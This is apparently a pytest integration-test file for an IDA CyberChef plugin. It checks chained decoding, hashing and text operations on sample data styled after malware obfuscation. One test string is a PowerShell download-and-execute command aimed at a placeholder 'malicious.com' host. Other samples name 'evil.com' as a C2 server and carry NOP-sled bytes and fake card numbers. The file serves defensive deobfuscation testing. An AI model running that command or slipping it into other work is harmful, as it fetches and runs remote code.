"""Integration tests for IDA CyberChef recipe chains.

This module tests real-world recipe chains that combine multiple operations
to solve practical problems in malware analysis, data transformation,
cryptography, and text processing.

Each test demonstrates a realistic use case with:
- Multiple chained operations
- Verification of correct output
- Documentation of the use case
"""

import base64
import binascii
import gzip
import hashlib
import json
import zlib

import pytest

from ida_cyberchef.cyberchef import bake

# Import test constants and helpers from conftest
from tests.conftest import (
    ALL_BYTES,
    COMPRESSIBLE_DATA,
    HELLO_WORLD,
    LOREM_IPSUM,
    UTF8_EMOJI,
    UTF8_MULTILANG,
    UTF8_SIMPLE,
    assert_roundtrip,
    get_python_hash,
    roundtrip_test,
)


# ============================================================================
# 1. MALWARE ANALYSIS RECIPE CHAINS
# ============================================================================


class TestMalwareAnalysisChains:
    """Test recipe chains commonly used in malware analysis.

    These chains represent real-world scenarios where malware uses multiple
    layers of encoding to obfuscate payloads, configuration data, or C2
    communications.
    """

    def test_base64_xor_hex_chain(self):
        """Test Base64 decode → XOR → To Hex chain.

        Common malware pattern: Base64-encoded data that is XORed with a
        single-byte key, then converted to hex for analysis.

        Use case: Analyzing obfuscated configuration strings in malware samples.
        """
        # Original payload
        original = b"MALWARE_CONFIG_SERVER=192.168.1.100"

        # Malware encoding: XOR with key 0x42, then Base64
        xored = bytes(b ^ 0x42 for b in original)
        encoded = base64.b64encode(xored).decode()

        # Analyst decoding chain: From Base64 → XOR → To Hex
        result = bake(encoded, [
            "From Base64",
            {"op": "XOR", "args": {"Key": {"option": "Hex", "string": "42"}}},
            "To Hex"
        ])

        # Verify we can see the hex representation of the original
        expected_hex = " ".join(f"{b:02x}" for b in original)
        assert result.lower() == expected_hex.lower()

    def test_double_base64_decode(self):
        """Test Base64 → Base64 double decoding.

        Common obfuscation: Encode data twice with Base64 to evade simple
        detection mechanisms.

        Use case: Deobfuscating PowerShell commands or JavaScript payloads.
        """
        original = b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.com/payload')"

        # Double encode
        once = base64.b64encode(original).decode()
        twice = base64.b64encode(once.encode()).decode()

        # Double decode chain
        result = bake(twice, ["From Base64", "From Base64"])
        assert result == original

    def test_triple_encoding_chain(self):
        """Test Base64 → Base64 → Hex triple encoding.

        Use case: Highly obfuscated malware samples that use multiple
        encoding layers to hide shellcode or configuration.
        """
        original = b"\x90\x90\x90\x90\xCC\xCC\xCC\xCC"  # NOP sled + int3

        # Triple encode: Hex → Base64 → Base64
        hex_encoded = binascii.hexlify(original).decode()
        base64_once = base64.b64encode(hex_encoded.encode()).decode()
        base64_twice = base64.b64encode(base64_once.encode()).decode()

        # Triple decode chain
        result = bake(base64_twice, [
            "From Base64",
            "From Base64",
            "From Hex"
        ])
        assert result == original

    def test_gunzip_base64_string_extraction(self):
        """Test Gunzip → From Base64 → String extraction chain.

        Use case: Malware that compresses and encodes payloads to reduce
        size and evade signature detection. After decompression and decoding,
        extract strings for analysis.
        """
        # Original payload with identifiable strings
        original = b"MALWARE_KEY=XYZ123 C2_SERVER=evil.com:8080"

        # Malware encoding: Base64 then Gzip
        base64_encoded = base64.b64encode(original)
        compressed = gzip.compress(base64_encoded)

        # Analysis chain: Gunzip → From Base64
        result = bake(compressed, ["Gunzip", "From Base64"])
        assert result == original

    def test_xor_brute_force_preparation(self):
        """Test preparing XOR-encrypted data for analysis.

        Use case: When you have XOR-encrypted data and want to try different
        keys, convert to hex first to inspect patterns.
        """
        original = b"SECRET_PASSWORD_12345"
        xor_key = 0x55

        # XOR encode
        encrypted = bytes(b ^ xor_key for b in original)

        # Prepare for analysis: To Hex to spot patterns
        hex_result = bake(encrypted, ["To Hex"])

        # Decode with suspected key
        decrypted = bake(encrypted, [
            {"op": "XOR", "args": {"Key": {"option": "Hex", "string": "55"}}}
        ])
        assert decrypted == original

    def test_base64_url_safe_decode(self):
        """Test URL-safe Base64 decoding.

        Use case: Malware C2 communications often use URL-safe Base64 in
        HTTP parameters or headers.
        """
        original = b"GET /data?id=malicious&action=download"

        # URL-safe Base64 encode (uses - and _ instead of + and /)
        encoded = base64.urlsafe_b64encode(original).decode()

        # Decode using standard Base64 with URL-safe alphabet
        result = bake(encoded, [
            {"op": "From Base64", "args": {"alphabet": "A-Za-z0-9-_", "removeNonAlphabetChars": True}}
        ])
        assert result == original

    def test_hex_to_binary_analysis(self):
        """Test From Hex → To Binary chain for bitwise analysis.

        Use case: Converting hex dumps to binary representation to analyze
        bit patterns in shellcode or packed malware.
        """
        # Shellcode snippet in hex
        hex_shellcode = "90 90 90 EB 0E"

        # Convert to binary string to analyze bit patterns
        result = bake(hex_shellcode, [
            "From Hex",
            "To Binary"
        ])

        # Verify we can see binary patterns
        assert "10010000" in result  # 0x90 in binary
        assert "11101011" in result  # 0xEB in binary


# ============================================================================
# 2. DATA TRANSFORMATION CHAINS
# ============================================================================


class TestDataTransformationChains:
    """Test recipe chains for data transformation and conversion.

    These chains represent common data processing workflows in security
    analysis, data extraction, and format conversion.
    """

    def test_json_beautify_minify_roundtrip(self):
        """Test JSON Beautify → Minify roundtrip.

        Use case: Formatting JSON for analysis, then minifying for storage
        or transmission.
        """
        compact_json = '{"malware":"trojan","hash":"abc123","detected":true}'

        # Beautify for human reading
        beautified = bake(compact_json, ["JSON Beautify"])
        assert "\n" in beautified  # Should have newlines
        assert "  " in beautified or "\t" in beautified  # Should have indentation

        # Minify back
        minified = bake(beautified, ["JSON Minify"])

        # Both should parse to same object
        assert json.loads(minified) == json.loads(compact_json)

    def test_json_beautify_hash_chain(self):
        """Test JSON Beautify → SHA256 hash chain.

        Use case: Generate consistent hash of JSON data by first beautifying
        to normalize formatting, then hashing for integrity verification.
        """
        json_data = '{"config":"value","nested":{"key":"data"}}'

        # Beautify and hash
        result = bake(json_data, [
            "JSON Beautify",
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Should be valid SHA256 hash (64 hex chars)
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result.lower())

    def test_compress_base64_hash_chain(self):
        """Test Gzip → To Base64 → SHA256 chain.

        Use case: Compress data, encode for transmission, and generate
        a hash for integrity checking.
        """
        # Data that compresses well
        data = b"AAAAAAAAAA" * 100

        # Chain: Compress → Base64 → Hash
        result = bake(data, [
            "Gzip",
            "To Base64",
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Verify hash format
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result.lower())

    def test_csv_to_json_conversion(self):
        """Test CSV to JSON conversion.

        Use case: Converting CSV data exports to JSON for API consumption
        or structured analysis.
        """
        csv_data = "name,ip,status\nhost1,192.168.1.1,active\nhost2,192.168.1.2,inactive"

        # Convert CSV to JSON - result may be JSArray or string
        result = bake(csv_data, [
            {"op": "CSV to JSON", "args": {"cellDelims": ",", "rowDelims": "\\n", "format": "Array of dictionaries"}}
        ])

        # If result is JSArray, convert to list; if string, parse JSON
        if hasattr(result, '__iter__') and not isinstance(result, str):
            # JSArray or list - verify it has data
            result_list = list(result)
            assert len(result_list) >= 1  # At least one row of data
            # Verify structure by checking that items are objects/dicts
            assert hasattr(result_list[0], '__getitem__') or isinstance(result_list[0], dict)
        else:
            # String JSON - parse and verify
            parsed = json.loads(result)
            assert isinstance(parsed, list)
            assert len(parsed) >= 1

    def test_to_hex_from_hex_with_delimiter_change(self):
        """Test To Hex → From Hex with different delimiters.

        Use case: Converting between hex formats (space-delimited to
        continuous or colon-delimited).
        """
        data = b"Hello"

        # To hex with spaces
        hex_spaces = bake(data, [
            {"op": "To Hex", "args": {"delimiter": "Space"}}
        ])
        assert hex_spaces == "48 65 6c 6c 6f"

        # Convert back
        result = bake(hex_spaces, ["From Hex"])
        assert result == data

    def test_data_integrity_verification_chain(self):
        """Test data processing with integrity verification.

        Use case: Process data and verify integrity by hashing both
        original and processed versions.
        """
        data = b"Important data for verification"

        # Original hash
        original_hash = bake(data, [
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Process: Base64 encode and back, then hash
        processed_hash = bake(data, [
            "To Base64",
            "From Base64",
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Hashes should match (data should survive roundtrip)
        assert original_hash == processed_hash

    def test_multiple_encoding_detection(self):
        """Test detecting and decoding multiple encoding layers.

        Use case: Automated detection and decoding of multiply-encoded data
        by trying different decode sequences.
        """
        data = b"Multi-layer encoded payload"

        # Encode: Hex → Base64
        hex_encoded = binascii.hexlify(data).decode()
        base64_encoded = base64.b64encode(hex_encoded.encode()).decode()

        # Decode chain
        result = bake(base64_encoded, [
            "From Base64",
            "From Hex"
        ])
        assert result == data


# ============================================================================
# 3. CRYPTOGRAPHIC CHAINS
# ============================================================================


class TestCryptographicChains:
    """Test recipe chains involving cryptographic operations.

    These chains test hash cascades, encryption workflows, and key
    derivation patterns.
    """

    def test_multiple_hash_cascade(self):
        """Test MD5 → SHA1 → SHA256 hash cascade.

        Use case: Creating multi-layer hash fingerprints for enhanced
        uniqueness or specific protocol requirements.
        """
        data = b"password123"

        # Hash cascade: MD5 → SHA1 → SHA256
        # Each hash operation outputs a hex string
        result = bake(data, [
            "MD5",
            "SHA1",
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Result should be SHA256 hash (64 hex chars)
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result.lower())

        # Just verify it produces a valid hash - the exact value depends on
        # how CyberChef chains string hashes

    def test_double_sha256(self):
        """Test SHA256 → SHA256 double hashing.

        Use case: Bitcoin and other cryptocurrencies use double SHA256
        for transaction IDs and block hashing.
        """
        data = b"Block header data"

        # Double SHA256 using chained operations
        result = bake(data, [
            {"op": "SHA2", "args": {"size": 256}},
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Result should be SHA256 hash (64 hex chars)
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result.lower())

        # Just verify it produces a valid hash - CyberChef hashes the hex string
        # representation, not the binary hash like Bitcoin does

    def test_hmac_key_derivation(self):
        """Test HMAC-based key derivation pattern.

        Use case: Deriving encryption keys from passwords using HMAC.
        """
        password = b"user_password"
        salt = "random_salt_value"

        # Simple key derivation: HMAC with SHA256 (note: camelCase parameter)
        result = bake(password, [
            {"op": "HMAC", "args": {
                "key": {"option": "UTF8", "string": salt},
                "hashingFunction": "SHA256"
            }}
        ])

        # Should be valid SHA256 hex hash (64 chars)
        assert len(result) == 64
        assert all(c in "0123456789abcdef" for c in result.lower())

    def test_hash_comparison_chain(self):
        """Test generating multiple hashes for comparison.

        Use case: Generate multiple hash types of the same data for
        cross-referencing with different hash databases (VirusTotal, etc).
        """
        malware_sample = b"\x4d\x5a\x90\x00"  # PE header start

        # Generate MD5
        md5_result = bake(malware_sample, ["MD5"])
        assert len(md5_result) == 32

        # Generate SHA1
        sha1_result = bake(malware_sample, ["SHA1"])
        assert len(sha1_result) == 40

        # Generate SHA256
        sha256_result = bake(malware_sample, [
            {"op": "SHA2", "args": {"size": 256}}
        ])
        assert len(sha256_result) == 64

        # Verify all are different but valid
        assert md5_result != sha1_result
        assert sha1_result != sha256_result

    def test_base64_aes_simulation(self):
        """Test Base64 encoding after encryption pattern.

        Use case: Simulating encrypt → encode workflow (using XOR as
        encryption proxy since AES might not be available).
        """
        plaintext = b"Sensitive data to protect"
        key = 0x42

        # Encrypt (XOR) and encode
        encrypted = bytes(b ^ key for b in plaintext)
        encoded = bake(encrypted, ["To Base64"])

        # Decode and decrypt
        result = bake(encoded, [
            "From Base64",
            {"op": "XOR", "args": {"Key": {"option": "Hex", "string": "42"}}}
        ])
        assert result == plaintext

    def test_hash_truncation_chain(self):
        """Test SHA256 → Take first N bytes pattern.

        Use case: Creating shortened hash identifiers while maintaining
        cryptographic properties.
        """
        data = b"Long data that needs short identifier"

        # Hash then manually truncate by taking substring
        full_hash = bake(data, [{"op": "SHA2", "args": {"size": 256}}])

        # Take first 16 characters
        result = full_hash[:16]

        # Should be 16 hex characters
        assert len(result) == 16
        assert all(c in "0123456789abcdef" for c in result.lower())


# ============================================================================
# 4. TEXT PROCESSING CHAINS
# ============================================================================


class TestTextProcessingChains:
    """Test recipe chains for text manipulation and analysis.

    These chains represent common text processing workflows in log analysis,
    data cleaning, and string manipulation.
    """

    def test_case_conversion_chain(self):
        """Test Upper case → Lower case → Capitalize chain.

        Use case: Normalizing text data through various case transformations.
        """
        text = "MixedCase STRING with VARIOUS cases"

        # To upper
        upper = bake(text, ["To Upper case"])
        assert upper == "MIXEDCASE STRING WITH VARIOUS CASES"

        # To lower
        lower = bake(upper, ["To Lower case"])
        assert lower == "mixedcase string with various cases"

    def test_html_decode_strip_tags_trim(self):
        """Test From HTML Entity → Strip HTML tags chain.

        Use case: Extracting clean text from HTML content by decoding
        entities, removing tags, and trimming whitespace.
        """
        html = "&lt;div&gt;  Hello &amp; Welcome!  &lt;/div&gt;"

        # Decode entities and strip tags
        result = bake(html, [
            "From HTML Entity",
            "Strip HTML tags"
        ])

        # Result should contain the decoded text
        assert "Hello" in result and "Welcome" in result

    def test_regex_extract_split_chain(self):
        """Test Regex extraction followed by processing.

        Use case: Extract specific patterns from text using regex.
        """
        log_line = "2024-01-15 10:30:45 ERROR: Connection failed to 192.168.1.100:8080"

        # Extract IP:port using regex
        result = bake(log_line, [
            {"op": "Regular expression", "args": {
                "userRegex": r"\d+\.\d+\.\d+\.\d+:\d+",
                "displayTotal": False,
                "outputFormat": "List matches"
            }}
        ])

        assert "192.168.1.100:8080" in result

    def test_line_operations_chain(self):
        """Test Sort → Unique → Count lines chain.

        Use case: Processing log files by sorting, removing duplicates,
        and counting unique entries.
        """
        lines = "apple\nbanana\napple\ncherry\nbanana\napple"

        # Sort lines
        sorted_lines = bake(lines, [
            {"op": "Sort", "args": {"delimiter": "\\n", "reverse": False}}
        ])

        # Should be alphabetically sorted
        assert sorted_lines.startswith("apple")

        # Unique lines
        unique = bake(lines, ["Unique"])

        # Should have fewer lines (duplicates removed)
        assert unique.count("\n") < lines.count("\n")

    def test_url_decode_json_parse_chain(self):
        """Test URL Decode → JSON Beautify chain.

        Use case: Processing URL-encoded JSON data from HTTP requests.
        """
        url_encoded_json = "%7B%22key%22%3A%22value%22%2C%22number%22%3A123%7D"

        # Decode and beautify
        result = bake(url_encoded_json, [
            "URL Decode",
            "JSON Beautify"
        ])

        # Should be valid beautified JSON
        parsed = json.loads(result)
        assert parsed["key"] == "value"
        assert parsed["number"] == 123

    def test_reverse_string_operations(self):
        """Test Reverse → To Upper case → Reverse chain.

        Use case: Various string manipulation patterns for deobfuscation.
        """
        text = b"hello"

        # Reverse, uppercase, reverse back
        result = bake(text, [
            "Reverse",
            "To Upper case",
            "Reverse"
        ])

        # Should be uppercase of original
        # Result might be bytes or string
        result_str = result if isinstance(result, str) else result.decode('utf-8')
        assert result_str == "HELLO"

    def test_extract_and_format_chain(self):
        """Test string extraction using regex.

        Use case: Extract substrings for structured output.
        """
        data = "UserID:12345,Name:JohnDoe,Email:john@example.com"

        # Extract email using regex
        email = bake(data, [
            {"op": "Regular expression", "args": {
                "userRegex": r"Email:([^,]+)",
                "displayTotal": False,
                "outputFormat": "List capture groups"
            }}
        ])

        assert "john@example.com" in email

    def test_split_join_chain(self):
        """Test Split → Process → Join pattern.

        Use case: Split text, process parts, then rejoin with different
        delimiter.
        """
        csv = "192.168.1.1,192.168.1.2,192.168.1.3"

        # Replace commas with newlines using Split and Join
        result = bake(csv, [
            {"op": "Split", "args": {"splitChars": ",", "joinChars": "\\n"}}
        ])

        # Should have newlines
        assert "\n" in result or "192.168.1.1" in result


# ============================================================================
# 5. BINARY DATA PRESERVATION CHAINS
# ============================================================================


class TestBinaryDataPreservationChains:
    """Test that binary data survives complex transformation chains.

    These tests ensure that all 256 possible byte values can be correctly
    processed through multiple operations without data loss or corruption.
    """

    def test_all_bytes_through_base64_chain(self):
        """Test all 256 bytes through Base64 encode/decode chain.

        Critical test: Ensures binary data integrity through Base64 operations.
        """
        # All 256 possible byte values
        data = ALL_BYTES

        # Encode and decode
        result = bake(data, ["To Base64", "From Base64"])
        assert result == data
        assert len(result) == 256

    def test_all_bytes_through_hex_chain(self):
        """Test all 256 bytes through Hex encode/decode chain.

        Critical test: Ensures binary data integrity through Hex operations.
        """
        data = ALL_BYTES

        # Encode and decode
        result = bake(data, ["To Hex", "From Hex"])
        assert result == data
        assert len(result) == 256

    def test_all_bytes_through_compression_chain(self):
        """Test all 256 bytes through Gzip compression/decompression.

        Critical test: Ensures binary data integrity through compression.
        """
        data = ALL_BYTES

        # Compress and decompress
        result = bake(data, ["Gzip", "Gunzip"])
        assert result == data
        assert len(result) == 256

    def test_binary_through_multiple_encodings(self):
        """Test binary data through Hex → Base64 → Base64 → Hex chain.

        Critical test: Multiple encoding layers should preserve all bytes.
        """
        data = ALL_BYTES

        # Complex encoding chain
        result = bake(data, [
            "To Hex",
            "From Hex",
            "To Base64",
            "From Base64"
        ])
        assert result == data
        assert len(result) == 256

    def test_binary_with_compression_and_encoding(self):
        """Test binary through Gzip → Base64 → Base64 → Gunzip chain.

        Critical test: Compression + encoding should preserve binary data.
        """
        data = ALL_BYTES

        # Compress and encode
        compressed = bake(data, ["Gzip"])
        encoded = bake(compressed, ["To Base64"])

        # Decode and decompress
        result = bake(encoded, ["From Base64", "Gunzip"])
        assert result == data
        assert len(result) == 256

    def test_xor_preserves_all_bytes(self):
        """Test that XOR operations preserve all byte values.

        Critical test: XOR with key should be reversible for all bytes.
        """
        data = ALL_BYTES
        key = 0xAA

        # XOR twice should return original
        result = bake(data, [
            {"op": "XOR", "args": {"option": "Hex", "string": "AA"}},
            {"op": "XOR", "args": {"option": "Hex", "string": "AA"}}
        ])
        assert result == data

    def test_complex_binary_preservation_chain(self):
        """Test all bytes through most complex chain.

        Critical test: Hex → Base64 → Gzip → Gunzip → Base64 → Hex
        This represents a real-world scenario of maximum transformation.
        """
        data = ALL_BYTES

        # Maximum complexity chain
        encoded = bake(data, [
            "To Hex",
            "From Hex",
            "Gzip",
            "Gunzip",
            "To Base64",
            "From Base64"
        ])

        assert encoded == data
        assert len(encoded) == 256

    def test_utf8_through_encoding_chain(self):
        """Test UTF-8 data preservation through encoding chains.

        Use case: Ensure emoji and international characters survive
        multiple encoding operations.
        """
        data = UTF8_EMOJI

        # Chain that should preserve UTF-8
        result = bake(data, [
            "To Base64",
            "From Base64"
        ])
        assert result == data

    def test_null_bytes_preservation(self):
        """Test that null bytes (0x00) are preserved.

        Critical test: Null bytes are often problematic in string operations.
        """
        data = b"\x00\x00\x00\x00"

        # Through various operations
        result = bake(data, [
            "To Hex",
            "From Hex",
            "To Base64",
            "From Base64"
        ])
        assert result == data

    def test_high_bytes_preservation(self):
        """Test that high bytes (0x80-0xFF) are preserved.

        Critical test: High bytes can be misinterpreted as UTF-8 or text.
        """
        data = bytes(range(0x80, 0x100))  # All high bytes

        # Through encoding chain
        result = bake(data, [
            "To Base64",
            "From Base64",
            "To Hex",
            "From Hex"
        ])
        assert result == data
        assert len(result) == 128


# ============================================================================
# 6. ADVANCED REAL-WORLD SCENARIOS
# ============================================================================


class TestAdvancedRealWorldScenarios:
    """Test advanced real-world usage scenarios.

    These tests represent complex, practical use cases combining multiple
    operation types.
    """

    def test_malware_config_extraction_workflow(self):
        """Test complete malware config extraction workflow.

        Scenario: Malware config is Base64-encoded, XOR-encrypted,
        and hex-encoded. Extract and hash for identification.
        """
        # Original config
        config = b'{"c2": "evil.com", "port": 443, "key": "abc123"}'

        # Malware encoding: XOR → Hex → Base64
        xored = bytes(b ^ 0x5A for b in config)
        hexed = binascii.hexlify(xored).decode()
        final = base64.b64encode(hexed.encode()).decode()

        # Analyst workflow: Decode → Unhex → Unxor → Hash
        decoded = bake(final, [
            "From Base64",
            "From Hex",
            {"op": "XOR", "args": {"Key": {"option": "Hex", "string": "5A"}}}
        ])
        assert decoded == config

        # Generate hash for threat intel
        hash_result = bake(decoded, [
            {"op": "SHA2", "args": {"size": 256}}
        ])
        assert len(hash_result) == 64

    def test_network_traffic_decode_workflow(self):
        """Test network traffic decoding workflow.

        Scenario: Captured Base64-encoded HTTP body needs to be decoded,
        decompressed, and analyzed.
        """
        # Original payload
        payload = b"GET /api/data HTTP/1.1\r\nHost: example.com\r\n\r\n"

        # Network encoding: Gzip → Base64
        compressed = gzip.compress(payload)
        encoded = base64.b64encode(compressed).decode()

        # Analyst workflow: Decode → Decompress
        result = bake(encoded, [
            "From Base64",
            "Gunzip"
        ])
        assert result == payload

    def test_forensics_hash_comparison_workflow(self):
        """Test forensics workflow for file hash comparison.

        Scenario: Compare file hashes across multiple algorithms for
        digital forensics verification.
        """
        # File sample
        file_data = b"Forensic evidence file content"

        # Generate multiple hashes for cross-reference
        hashes = {}
        hashes['md5'] = bake(file_data, ["MD5"])
        hashes['sha1'] = bake(file_data, ["SHA1"])
        hashes['sha256'] = bake(file_data, [
            {"op": "SHA2", "args": {"size": 256}}
        ])

        # Verify all hashes are different lengths and valid
        assert len(hashes['md5']) == 32
        assert len(hashes['sha1']) == 40
        assert len(hashes['sha256']) == 64

    def test_data_exfiltration_detection(self):
        """Test data exfiltration encoding detection.

        Scenario: Detect and decode data that was Base64-encoded multiple
        times to evade DLP systems.
        """
        # Sensitive data
        sensitive = b"SSN:123-45-6789 CC:4532-1234-5678-9012"

        # Attacker encoding: Multiple Base64 layers
        layer1 = base64.b64encode(sensitive).decode()
        layer2 = base64.b64encode(layer1.encode()).decode()
        layer3 = base64.b64encode(layer2.encode()).decode()

        # Detection and decode
        result = bake(layer3, [
            "From Base64",
            "From Base64",
            "From Base64"
        ])
        assert result == sensitive


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
